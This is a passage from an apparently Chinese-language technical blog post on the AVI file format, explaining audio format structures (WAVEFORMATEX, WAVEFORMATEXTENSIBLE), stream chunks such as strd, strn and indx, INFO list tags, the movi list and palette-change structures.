WAVEFORMATEXTENSIBLE;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong><code>WAVEFORMATEX</code></strong>结构体成员含义：</p><blockquote><ul><li><strong><code>wFormatTag</code></strong>: <code>波形音频格式</code>类型。格式标签已向<code>Microsoft Corporation</code>注册用于许多<code>压缩算法</code>。可以在<code>Mmreg.h</code>头文件中找到<code>格式标签</code>的完整列表。 对于<code>一个或两个通道</code>的<code>PCM数据</code>，此值应为<code>WAVE_FORMAT_PCM</code>。当此结构包含在<code>WAVEFORMATEXTENSIBLE</code>结构中时，此值必须为<code>WAVE_FORMAT_EXTENSIBLE</code>。</li><li><strong><code>nChannels</code></strong>: <code>波形音频数据</code>中的<code>通道数</code>。<code>单声道</code>数据使用<code>一个通道</code>，<code>立体声</code>数据使用<code>两个通道</code>。</li><li><strong><code>nSamplesPerSec</code></strong>: <code>采样率</code>，以<code>每秒采样数</code>(赫兹:hz)为单位。如果<code>wFormatTag</code>为<code>WAVE_FORMAT_PCM</code>，则<code>nSamplesPerSec</code>的常用值为<code>8.0kHz</code>，<code>11.025kHz</code>，<code>22.05kHz</code>和<code>44.1kHz</code>。对于<code>非PCM</code>格式，必须根据<code>制造商</code>的<code>格式标签规范</code>来计算此成员。</li><li><strong><code>nAvgBytesPerSec</code></strong>: 格式标签所需的<code>平均数据传输速率</code>，以<code>字节每秒</code>为单位。如果<code>wFormatTag</code>是<code>WAVE_FORMAT_PCM</code>，则<code>nAvgBytesPerSec</code>应该等于<code>nSamplesPerSec</code>和<code>nBlockAlign</code>的乘积。对于<code>非PCM</code>格式，必须根据<code>制造商</code>的<code>格式标签规范</code>来计算此成员。</li><li><strong><code>nBlockAlign</code></strong>: <code>块对齐</code>，以<code>字节</code>为单位。块对齐是<code>wFormatTag</code>格式类型的<code>最小数据原子单位</code>。如果<code>wFormatTag</code>是<code>WAVE_FORMAT_PCM</code>或<code>WAVE_FORMAT_EXTENSIBLE</code>，则<code>nBlockAlign</code>必须等于<code>nChannels</code>和<code>wBitsPerSample</code>的<code>乘积除以8</code>(位/字节)。对于<code>非PCM</code>格式，必须根据<code>制造商</code>的<code>格式标签规范</code>来计算此成员。软件必须一次处理<code>多个nBlockAlign字节</code>数据。对设备的<code>读写数据</code>必须始终从<code>块的开头</code>开始。例如，在<code>样本中间</code>(即在<code>非块对齐边界</code>上)开始播放<code>PCM数据</code>是<code>非法</code>的。</li><li><strong><code>wBitsPerSample</code></strong>: <code>wFormatTag</code>格式类型的<code>每个样本位数</code>。如果<code>wFormatTag</code>是<code>WAVE_FORMAT_PCM</code>，则<code>wBitsPerSample</code>应该等于<code>8或16</code>。对于<code>非PCM</code>格式，必须根据<code>制造商</code>的<code>格式标签规范</code>设置此成员。如果<code>wFormatTag</code>是<code>WAVE_FORMAT_EXTENSIBLE</code>，则此值可以是<code>8的任何整数倍</code>，并表示<code>容器的大小</code>，不一定是<code>样本的大小</code>；例如，一个<code>20位样本</code>在<code>24位容器</code>中。某些<code>压缩方案</code>无法为<code>wBitsPerSample</code>定义值，因此该成员<code>可以为0</code>。</li><li><strong><code>cbSize</code></strong>: 附加在<code>WAVEFORMATEX</code>结构末尾的<code>额外格式信息的大小</code>(以<code>字节</code>为单位)。<code>非PCM</code>格式可以使用此信息来存储<code>wFormatTag</code>的<code>其他属性</code>。如果<code>wFormatTag</code>不需要其他信息，则必须将此成员<code>设置为0</code>。对于<code>WAVE_FORMAT_PCM</code>格式(仅WAVE_FORMAT_PCM格式)，将<code>忽略</code>此成员。当此结构包含在<code>WAVEFORMATEXTENSIBLE</code>结构中时，该值必须<code>至少为22</code>。</li></ul></blockquote><p>&emsp;&emsp;使用<code>额外信息</code>的格式的一个示例是<code>Microsoft自适应增量脉冲编码调制</code>(MS-ADPCM)格式。 <code>MS-ADPCM</code>的<code>wFormatTag</code>是<code>WAVE_FORMAT_ADPCM</code>。<code>cbSize</code>成员通常将<code>设置为32</code>。为<code>WAVE_FORMAT_ADPCM</code>存储的额外信息是<code>编码和解码</code>波形音频数据所需的<code>系数对</code>。</p><p>&emsp;&emsp;<strong><code>WAVEFORMATEXTENSIBLE</code></strong>结构体成员含义：</p><blockquote><ul><li><strong><code>Format</code></strong>: 指定基本格式的<code>WAVEFORMATEX</code>结构。<code>wFormatTag</code>成员必须为<code>WAVE_FORMAT_EXTENSIBLE</code>。<code>cbSize</code>成员必须<code>至少为22</code>。</li><li><strong><code>Samples</code></strong>: 描述<code>样本格式</code>的联合体(union)。<ul><li><strong><code>Samples.wValidBitsPerSample</code></strong>: 信号中的<code>精度位数</code>。通常等于<code>WAVEFORMATEX.wBitsPerSample</code>。但是，<code>wBitsPerSample</code>是<code>容器大小</code>，并且必须是<code>8的倍数</code>，而<code>wValidBitsPerSample</code>可以是<code>不超过容器大小</code>的任何值。例如，如果格式使用<code>20位样本</code>，则<code>wBitsPerSample</code>必须<code>至少为24</code>，而<code>wValidBitsPerSample</code>为<code>20</code>。</li><li><strong><code>Samples.wSamplesPerBlock</code></strong>: 一个<code>音频数据压缩块</code>中包含的<code>样本数</code>。此值用于<code>缓冲区估计</code>。该值与<code>压缩格式</code>一起使用，该压缩格式在<code>每个块</code>中具有<code>固定数量的样本</code>。如果<code>每个压缩音频数据块</code>中包含<code>可变数量的样本</code>，则可以将该值<code>设置为0</code>。在这种情况下，需要以其他方式获得<code>缓冲区估计</code>和<code>位置信息</code>。</li><li><strong><code>Samples.wReserved</code></strong>: <code>保留</code>给操作系统内部使用。<code>设置为0</code>。</li></ul></li><li><strong><code>dwChannelMask</code></strong>: <code>通道掩码</code>，<code>位掩码</code>，指定将<code>流中的通道</code>分配给<code>扬声器的位置</code>。</li><li><strong><code>SubFormat</code></strong>: 数据的<code>子格式</code>，例如<code>KSDATAFORMAT_SUBTYPE_PCM</code>。子格式信息类似于<code>WAVEFORMATEX</code>结构的<code>wFormatTag</code>成员中的标签所提供的信息。</li></ul></blockquote><p>&emsp;&emsp;<code>WAVEFORMATEXTENSIBLE</code>可以描述<code>WAVEFORMATEX</code>可以描述的<code>任何格式</code>，但可以为<code>两个以上的通道</code>提供额外的支持，为了使<code>每个样本的位数</code>更精确，并支持<code>新的压缩方案</code>。</p><p>&emsp;&emsp;<code>WAVEFORMATEXTENSIBLE</code>可以安全地强制转换为<code>WAVEFORMATEX</code>，因为它仅配置<code>WAVEFORMATEX.cbSize</code>指定的额外字节。</p><p>&emsp;&emsp;<strong><code>dwChannelMask</code></strong>成员指定<code>多通道流</code>中存在<code>哪些通道</code>。<code>最低有效位</code>对应于<code>左前扬声器</code>，<code>下一个最低有效位</code>对应于<code>右前扬声器</code>，依此类推。这些位按<code>意义顺序</code>定义如下。</p><table><thead><tr><th style="text-align:left">Speaker Position</th><th style="text-align:left">Flag Bit</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">SPEAKER_FRONT_LEFT</td><td style="text-align:left">0x1</td><td style="text-align:left">左前扬声器</td></tr><tr><td style="text-align:left">SPEAKER_FRONT_RIGHT</td><td style="text-align:left">0x2</td><td style="text-align:left">右前扬声器</td></tr><tr><td style="text-align:left">SPEAKER_FRONT_CENTER</td><td style="text-align:left">0x4</td><td style="text-align:left">前中扬声器</td></tr><tr><td style="text-align:left">SPEAKER_LOW_FREQUENCY</td><td style="text-align:left">0x8</td><td style="text-align:left">低频扬声器</td></tr><tr><td style="text-align:left">SPEAKER_BACK_LEFT</td><td style="text-align:left">0x10</td><td style="text-align:left">左后扬声器</td></tr><tr><td style="text-align:left">SPEAKER_BACK_RIGHT</td><td style="text-align:left">0x20</td><td style="text-align:left">右后扬声器</td></tr><tr><td style="text-align:left">SPEAKER_FRONT_LEFT_OF_CENTER</td><td style="text-align:left">0x40</td><td style="text-align:left">左前中置扬声器</td></tr><tr><td style="text-align:left">SPEAKER_FRONT_RIGHT_OF_CENTER</td><td style="text-align:left">0x80</td><td style="text-align:left">右前中置扬声器</td></tr><tr><td style="text-align:left">SPEAKER_BACK_CENTER</td><td style="text-align:left">0x100</td><td style="text-align:left">后中扬声器</td></tr><tr><td style="text-align:left">SPEAKER_SIDE_LEFT</td><td style="text-align:left">0x200</td><td style="text-align:left">左侧扬声器</td></tr><tr><td style="text-align:left">SPEAKER_SIDE_RIGHT</td><td style="text-align:left">0x400</td><td style="text-align:left">右侧扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_CENTER</td><td style="text-align:left">0x800</td><td style="text-align:left">上层中置扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_FRONT_LEFT</td><td style="text-align:left">0x1000</td><td style="text-align:left">上层左前扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_FRONT_CENTER</td><td style="text-align:left">0x2000</td><td style="text-align:left">上层前中扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_FRONT_RIGHT</td><td style="text-align:left">0x4000</td><td style="text-align:left">上层右前扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_BACK_LEFT</td><td style="text-align:left">0x8000</td><td style="text-align:left">上层左后扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_BACK_CENTER</td><td style="text-align:left">0x10000</td><td style="text-align:left">上层后中扬声器</td></tr><tr><td style="text-align:left">SPEAKER_TOP_BACK_RIGHT</td><td style="text-align:left">0x20000</td><td style="text-align:left">上层右后扬声器</td></tr></tbody></table><p>&emsp;&emsp;<code>dwChannelMask</code>中指定的通道必须以<code>规定的顺序</code>显示(从<code>最低有效位</code>开始)。例如，如果仅指定<code>SPEAKER_FRONT_LEFT</code>和<code>SPEAKER_FRONT_RIGHT</code>，则<code>左前扬声器</code>的采样必须<code>首先</code>出现在<code>交错流</code>中。<code>dwChannelMask</code>中设置的<code>位数</code>应与<code>WAVEFORMATEX.nChannels</code>中指定的<code>通道数</code>相同。</p><p>&emsp;&emsp;为了<code>向后兼容</code>，任何可以由独立的<code>WAVEFORMATEX</code>结构指定的<code>波形格式</code>也可以由<code>WAVEFORMATEXTENSIBLE</code>结构定义。因此，<code>mmreg.h</code>中的每个<code>波形格式标签</code>都具有一个对应的<code>SubFormat GUID</code>。下表显示了一些典型的<strong><code>波形格式标签</code></strong>及其相应的<strong><code>SubFormat GUID</code></strong>。这些GUID在<code>Ksmedia.h</code>中定义。</p><table><thead><tr><th style="text-align:left">Wave-Format Tag</th><th style="text-align:left">SubFormat GUID</th></tr></thead><tbody><tr><td style="text-align:left">WAVE_FORMAT_PCM</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_PCM</td></tr><tr><td style="text-align:left">WAVE_FORMAT_IEEE_FLOAT</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_IEEE_FLOAT</td></tr><tr><td style="text-align:left">WAVE_FORMAT_DRM</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_DRM</td></tr><tr><td style="text-align:left">WAVE_FORMAT_ALAW</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_ALAW</td></tr><tr><td style="text-align:left">WAVE_FORMAT_MULAW</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_MULAW</td></tr><tr><td style="text-align:left">WAVE_FORMAT_ADPCM</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_ADPCM</td></tr></tbody></table><p>&emsp;&emsp;由于<code>WAVEFORMATEXTENSIBLE</code>是<code>WAVEFORMATEX</code>的扩展版本，因此它可以描述其他<code>WAVEFORMATEX</code>无法<code>单独描述</code>的格式。<code>供应商</code>可以自由定义自己的<code>SubFormat GUID</code>，以标识没有<code>波形格式标签</code>的<code>专有格式</code>。</p><p>&emsp;&emsp;对于特定的<strong><code>扩展格式</code></strong>，以下结构定义为<code>WAVEFORMATEXTENSIBLE</code>。</p><table><thead><tr><th style="text-align:left">Definition</th><th style="text-align:left">Value of SubFormat</th></tr></thead><tbody><tr><td style="text-align:left">WAVEFORMATIEEEFLOATEX</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_IEEE_FLOAT</td></tr><tr><td style="text-align:left">WAVEFORMATPCMEX</td><td style="text-align:left">KSDATAFORMAT_SUBTYPE_PCM</td></tr></tbody></table><h5 id="2-2-2-3、strd-Chunk-Stream-Header-Data-Additional-Header-Data"><a href="#2-2-2-3、strd-Chunk-Stream-Header-Data-Additional-Header-Data" class="headerlink" title="2.2.2.3、strd Chunk(Stream Header Data / Additional Header Data)"></a>2.2.2.3、strd Chunk(Stream Header Data / Additional Header Data)</h5><p>&emsp;&emsp;<strong><code>“strd Chunk”</code></strong>紧跟在<code>“strf Chunk”</code>之后，保存的是<code>可选的</code>额外的<code>流的头信息</code>数据。如果存在<code>Stream Header Data</code>(“strd”)块，则其遵循<code>Stream Format</code>(“strf”)块。该块的<code>格式和内容</code>由<code>编解码器驱动程序</code>定义。通常，<code>驱动程序</code>使用此信息进行<code>配置</code>。<code>读取和写入</code>AVI文件的应用程序不需要<code>解释此信息</code>。他们简单地将其作为<code>存储块</code>在<code>驱动程序之间</code>来回传输。</p><h5 id="2-2-2-4、strn-Chunk-Stream-Name"><a href="#2-2-2-4、strn-Chunk-Stream-Name" class="headerlink" title="2.2.2.4、strn Chunk(Stream Name)"></a>2.2.2.4、strn Chunk(Stream Name)</h5><p>&emsp;&emsp;可选的<strong><code>“strn”</code></strong>块包含描述该流的<code>以null结尾</code>的<code>文本字符串</code>。该块包含<code>流的名称</code>。该流名称仅应使用<code>纯ASCII</code>，尤其不能使用<code>UTF-8</code>。</p><h5 id="2-2-2-5、indx-Chunk-Super-Index-Chunk"><a href="#2-2-2-5、indx-Chunk-Super-Index-Chunk" class="headerlink" title="2.2.2.5、indx Chunk(Super Index Chunk)"></a>2.2.2.5、indx Chunk(Super Index Chunk)</h5><p>&emsp;&emsp;只有符合<strong><code>Open-DML(AVI2.0)</code></strong>规范的<code>AVI文件</code>才可能<code>存在此块</code>。每个流在其<code>Stream Header List</code>(“strl”)中都包含一个<strong><code>“indx”</code></strong>块。该块是<code>超级索引块</code>(Upper Level Index Chunk或Super Index Chunk)，<code>索引的索引</code>。</p><p>&emsp;&emsp;<strong><code>Upper Level Index</code></strong>(“Super Index”)指向<code>其他索引块</code>，并具有以下结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">avisuperindex</span> &#123;</span></span><br><span class="line">    FOURCC  fcc;</span><br><span class="line">    UINT    cb;</span><br><span class="line">    WORD    wLongsPerEntry;</span><br><span class="line">    BYTE    bIndexSubType;</span><br><span class="line">    BYTE    bIndexType;</span><br><span class="line">    DWORD   nEntriesInUse;</span><br><span class="line">    DWORD   dwChunkId;</span><br><span class="line">    DWORD   dwReserved[<span class="number">3</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">avisuperindex_entry</span> &#123;</span></span><br><span class="line">        __int64   qwOffset;</span><br><span class="line">        DWORD     dwSize;</span><br><span class="line">        DWORD     dwDuration;</span><br><span class="line">    &#125; aIndex[];</span><br><span class="line">&#125; AVISUPERINDEX;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>fcc</code></strong>: <code>FourCC</code>代码。与<code>Chunk</code>结构体中的<code>dwFourCC</code>相同。该值必须为<code>&#39;indx&#39;</code>。</li><li><strong><code>cb</code></strong>: 此结构体的<code>大小</code>，与<code>Chunk</code>结构体中的<code>dwSize</code>相同。不包括初始的<code>8个字节</code>(fcc和cb)。</li><li><strong><code>wLongsPerEntry</code></strong>: 每个<code>索引项的大小</code>，以<code>4字节</code>为单位。此值<code>必须为4</code>。每个<code>aIndex[i]</code>的大小为<code>4*wLongsPerEntry</code>个字节。(每个<code>aIndex[i]</code>的结构取决于<code>特定类型的索引</code>)</li><li><strong><code>bIndexSubType</code></strong>: <code>索引子类型</code>。必须为<code>0</code>或<code>AVI_INDEX_SUB_2FIELD</code>。</li><li><strong><code>bIndexType</code></strong>: <code>索引类型</code>。必须为<code>AVI_INDEX_OF_INDEXES</code>。</li><li><strong><code>nEntriesInUse</code></strong>: aIndex数组中<code>有效的条目数</code>。<code>aIndex[0]..aIndex[nEntriesInUse-1]</code>有效。</li><li><strong><code>dwChunkId</code></strong>: 标识<code>被索引</code>的对象的<code>FourCC</code>。<code>索引</code>指向的<code>流的ID</code>，例如<code>“00dc”</code>。因此，一个这样的<code>索引块</code>只能指向<code>同一个流</code>的数据。</li><li><strong><code>dwReserved</code></strong>: <code>保留</code>。将数组元素<code>设置为0</code>。</li><li><strong><code>aIndex</code></strong>: 包含下列成员的结构体数组。数组中的<code>元素数量</code>是根据<code>cb的值</code>计算的。<ul><li><strong><code>qwOffset</code></strong>: 从<code>文件开头</code>到该条目所指向的<code>子索引块</code>的<code>偏移量</code>，以<code>字节</code>为单位。</li><li><strong><code>dwSize</code></strong>: <code>子索引块</code>的<code>大小</code>(该条目指向的<code>标准</code>或<code>域</code>索引块的大小)，以<code>字节</code>为单位。</li><li><strong><code>dwDuration</code></strong>: <code>子索引</code>所覆盖的文件的<code>持续时间</code>，以<code>流节拍</code>(stream ticks)为测量单位，如在<code>AVI Stream Header</code>中指出的(<code>dwScale/dwRate</code>)。对于<code>视频</code>或<code>VBR音频</code>，通常指<code>帧数</code>。</li></ul></li></ul></blockquote><p>&emsp;&emsp;<strong><code>“indx Chunk”</code></strong>(Super Index Chunk)的示意图如下：</p><div align="left"><img src="/resources/2020/AVI_Format/Super Index Chunk.png" width="70%" height="50%" alt="Super Index Chunk(indx)"></div><h3 id="2-3、INFO-List"><a href="#2-3、INFO-List" class="headerlink" title="2.3、INFO List"></a>2.3、INFO List</h3><p>&emsp;&emsp;<strong><code>“INFO”</code></strong>列表是已注册的<code>全局表单</code>类型，可以存储有助于<code>识别块内容</code>的信息。此信息很有用，但不会影响<code>程序解释文件</code>的方式；例如<code>版权信息</code>和<code>注释</code>。<code>“INFO”</code>列表是列表类型为<code>“INFO”</code>的<code>“LIST”</code>块。以下示例显示了示例<code>“INFO”</code>列表块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIST('INFO' INAM("Two Trees"Z)</span><br><span class="line">            ICMT(<span class="string">"A picture for the opening screen"</span>Z) </span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>“INFO”</code>列表应仅包含<strong><code>以下块</code></strong>。可以定义<code>新的块</code>，但是应用程序应<code>忽略</code>它<code>不理解</code>的任何块。下面列出的块可能仅出现在<code>“INFO”</code>列表中。每个块都包含一个<code>ZSTR</code>或<code>以null结尾</code>的文本字符串(所有<code>文本字符串</code>必须<code>对齐</code>)。</p><table><thead><tr><th style="text-align:center">Chunk ID</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:center">IARL</td><td style="text-align:left">存档位置(Archival Location)。指示文件主题的存档位置。</td></tr><tr><td style="text-align:center">IART</td><td style="text-align:left">艺术家(Artist)。列出文件原始主题的艺术家；例如，“Michaelangelo.”。</td></tr><tr><td style="text-align:center">ICMS</td><td style="text-align:left">受委托的(Commissioned)。列出受委托的文件主题的人员或组织的名称；例如“Pope Julian II.”。</td></tr><tr><td style="text-align:center">ICMT</td><td style="text-align:left">注释(Comments)。提供有关文件或文件主题的一般注释。如果注释长几个句子，请以句号结尾每个句子。不要包含换行符。</td></tr><tr><td style="text-align:center">ICOP</td><td style="text-align:left">版权(Copyright)。记录文件的版权信息；例如，“Copyright Encyclopedia International 1991.”。如果有多个版权，请用分号和空格隔开。</td></tr><tr><td style="text-align:center">ICRD</td><td style="text-align:left">创建日期(Creation date)。指定创建文件主题的日期。以年-月-日格式列出日期，左边用0填充一位数的月和日；例如1553年5月3日的“1553-05-03”。</td></tr><tr><td style="text-align:center">ICRP</td><td style="text-align:left">裁剪(Cropped)。描述图像是否已裁剪，如果已裁剪，则如何裁剪；例如“lower-right corner.”。</td></tr><tr><td style="text-align:center">IDIM</td><td style="text-align:left">大小(Dimensions)。指定文件原始主题的大小；例如，“8.5 in h，11 in w”</td></tr><tr><td style="text-align:center">IDPI</td><td style="text-align:left">每英寸点数(Dots Per Inch)。存储用于生成文件的数字化转换器的每英寸点数设置，例如“300”。</td></tr><tr><td style="text-align:center">IENG</td><td style="text-align:left">工程师(Engineer)。存储处理文件的工程师的姓名。如果有多个工程师，请用分号和空格分隔名称；例如，“Smith, John; Adams, Joe.”</td></tr><tr><td style="text-align:center">IGNR</td><td style="text-align:left">类型(Genre)。描述原始作品，例如“landscape,”、“portrait,”、“still life,”等。</td></tr><tr><td style="text-align:center">IKEY</td><td style="text-align:left">关键字(Keywords)。提供引用文件或文件主题的关键字列表。用分号和空格分隔多个关键字；例如，“Seattle; aerial view; scenery.”</td></tr><tr><td style="text-align:center">ILGT</td><td style="text-align:left">亮度(Lightness)。描述生成文件所需的数字化转换器的亮度设置的更改。请注意，此信息的格式取决于所使用的硬件。</td></tr><tr><td style="text-align:center">IMED</td><td style="text-align:left">媒介(Medium)。描述文件的原始主题，例如“computer image,”(计算机图片)、“drawing,”(绘画)、“lithograph,”(石板画)等。</td></tr><tr><td style="text-align:center">INAM</td><td style="text-align:left">名称(Name)。存储文件主题的标题，例如“Seattle From Above.”</td></tr><tr><td style="text-align:center">IPLT</td><td style="text-align:left">调色板设置(Palette Setting)。指定数字化图像时要求的颜色数量，例如“256”。</td></tr><tr><td style="text-align:center">IPRD</td><td style="text-align:left">产物(Product)。指定文件最初打算使用的标题的名称，例如“Encyclopedia of Pacific Northwest Geography.”。</td></tr><tr><td style="text-align:center">ISBJ</td><td style="text-align:left">主题(Subject)。描述文件的内容，例如“Aerial view of Seattle.”。</td></tr><tr><td style="text-align:center">ISFT</td><td style="text-align:left">软件(Software)。标识用于创建文件的软件包的名称，例如“Microsoft WaveEdit.”。</td></tr><tr><td style="text-align:center">ISHP</td><td style="text-align:left">清晰度(Sharpness)。标识生成文件所需的数字化转换器的清晰度变化(格式取决于所使用的硬件)。</td></tr><tr><td style="text-align:center">ISRC</td><td style="text-align:left">源(Source)。标识提供文件原始主题的人员或组织的名称；例如“Trey Research.”。</td></tr><tr><td style="text-align:center">ISRF</td><td style="text-align:left">原始形式(Source Form)。标识被数字化的材料的原始形式，例如“slide,”、“paper,”、“map,”等。这不一定与IMED相同。</td></tr><tr><td style="text-align:center">ITCH</td><td style="text-align:left">技术员(Technician)。标识将主题文件数字化的技术人员；例如“Smith, John.”。</td></tr></tbody></table><h3 id="2-4、movi-List"><a href="#2-4、movi-List" class="headerlink" title="2.4、movi List"></a>2.4、movi List</h3><p>&emsp;&emsp;头信息(<code>hdrl List</code>)之后是一个<strong><code>“movi”</code></strong>列表，其中包含<code>流中的实际数据</code>，即<code>视频帧</code>和<code>音频样本</code>。数据块可以<strong><code>直接驻留</code></strong>在<code>“movi”</code>列表中，或者它们可能会<code>被归类</code>到<strong><code>“rec”列表</code></strong>中。<code>“rec”</code>分组意味着应该<code>一次性</code>从磁盘读取分组的块，并且该块旨在用于<code>从CD-ROM交错播放</code>的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LIST movi</span><br><span class="line">    LIST rec</span><br><span class="line">        01wb</span><br><span class="line">        01wb</span><br><span class="line">        02wb</span><br><span class="line">        03wb</span><br><span class="line">        03wb</span><br><span class="line">        03wb</span><br><span class="line">        00dc</span><br><span class="line">        00dc</span><br><span class="line">    LIST rec</span><br><span class="line">        01wb</span><br><span class="line">        02wb</span><br><span class="line">    LIST rec</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        ix01</span><br><span class="line">        ix02</span><br><span class="line">        ix03</span><br><span class="line">        ....</span><br><span class="line">        ....</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;将块分组为<code>rec-Lists</code>可防止在使用<code>Microsoft AVI Splitter</code>进行重放时<code>过多的搜索</code>，但不允许在某些<code>独立的重放设备</code>上进行播放。</p><p>&emsp;&emsp;流的<code>最大块</code>大小应<code>小于</code>相应的<code>dwSuggestedBufferSize</code>值。否则，某些播放器，尤其是<code>Microsoft AVI Splitter</code>，可能会<code>发生故障</code>。</p><p>&emsp;&emsp;标识每个数据块的<code>FourCC</code>包含一个<code>两位数字</code>的<code>流编号</code>，后面跟着的是一个用于定义块中<code>信息的类型</code>的<strong><code>两个字符的编码</code></strong>。</p><table><thead><tr><th style="text-align:center">Two-Character Code</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:center">..db</td><td style="text-align:left">未压缩视频帧数据块</td></tr><tr><td style="text-align:center">..dc</td><td style="text-align:left">压缩视频帧数据块</td></tr><tr><td style="text-align:center">..wb</td><td style="text-align:left">音频数据块</td></tr><tr><td style="text-align:center">..tx</td><td style="text-align:left">字幕数据块</td></tr><tr><td style="text-align:center">ix..</td><td style="text-align:left">标准索引块</td></tr><tr><td style="text-align:center">..pc</td><td style="text-align:left">调色板更换数据块</td></tr></tbody></table><p>&emsp;&emsp;例如，如果<code>Stream0</code>包含<code>音频</code>，则该流的数据块将具有<code>“00wb”</code>形式的<code>FourCC</code>。如果<code>Stream1</code>包含<code>视频</code>，则该流的数据块将具有<code>“01db”</code>或<code>“01dc”</code>形式的<code>FourCC</code>。<code>视频数据块</code>还可以定义<code>新的调色板条目</code>，以便在<code>AVI序列</code>期间<code>更新调色板</code>。每个<code>调色板更换数据块</code>(<code>“..pc”</code>)都包含一个<code>AVIPALCHANGE</code>结构。如果流包含<code>调色板更换数据块</code>(“..pc”)，请在该流的<code>AVISTREAMHEADER</code>结构的<code>dwFlags</code>成员中设置<code>AVISF_VIDEO_PALCHANGES</code>标志。<code>文本流</code>可以使用<code>任意Two-Character Code</code>。</p><p>&emsp;&emsp;<strong><code>AVIPALCHANGE</code></strong>结构体定义了AVI文件中的<code>调色板更换</code>的相关信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    BYTE         bFirstEntry;</span><br><span class="line">    BYTE         bNumEntries;</span><br><span class="line">    WORD         wFlags;</span><br><span class="line">    PALETTEENTRY peNew[];</span><br><span class="line">&#125; AVIPALCHANGE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPALETTEENTRY</span> &#123;</span></span><br><span class="line">    BYTE peRed;</span><br><span class="line">    BYTE peGreen;</span><br><span class="line">    BYTE peBlue;</span><br><span class="line">    BYTE peFlags;</span><br><span class="line">&#125; PALETTEENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagLOGPALETTE</span> &#123;</span></span><br><span class="line">    WORD         palVersion;</span><br><span class="line">    WORD         palNumEntries;</span><br><span class="line">    PALETTEENTRY palPalEntry[<span class="number">1</span>];</span><br><span class="line">&#125; LOGPALETTE;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>bFirstEntry</code></strong>: 指定要更改的<code>第一个调色板条目</code>的索引。</li><li><strong><code>bNumEntries</code></strong>: 指定要更改的<code>调色板条目数</code>，或者<code>指定零</code>以更改<code>所有256个</code>调色板条目。</li><li><strong><code>wFlags</code></strong>: 保留。</li><li><strong><code>peNew</code></strong>: 指定大小为<code>bNumEntries</code>的<code>PALETTEENTRY</code>结构的数组。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>PALETTEENTRY</code></strong>结构指定<code>逻辑调色板</code>中条目的<code>颜色</code>和<code>用法</code>。逻辑调色板由<code>LOGPALETTE</code>结构定义。</p><blockquote><ul><li><strong><code>peRed</code></strong>: 调色板条目的<code>红色</code>强度值。</li><li><strong><code>peGreen</code></strong>: 调色板条目的<code>绿色</code>强度值。</li><li><strong><code>peBlue</code></strong>: 调色板条目的<code>蓝色</code>强度值。</li><li><strong><code>peFlags</code></strong>: 指示<code>如何使用</code>调色板条目。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>peFlags</code></strong>可以设置为<code>0</code>或<code>以下值之一</code>。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:left">Meaning</th></tr></thead><tbody><tr><td style="text-align:left">PC_EXPLICIT</td><td style="text-align:left">说明逻辑调色板条目的低位字指定的是硬件调色板索引。该标志允许应用程序显示显示设备面板的内容。</td></tr><tr><td style="text-align:left">PC_NOCOLLAPSE</td><td 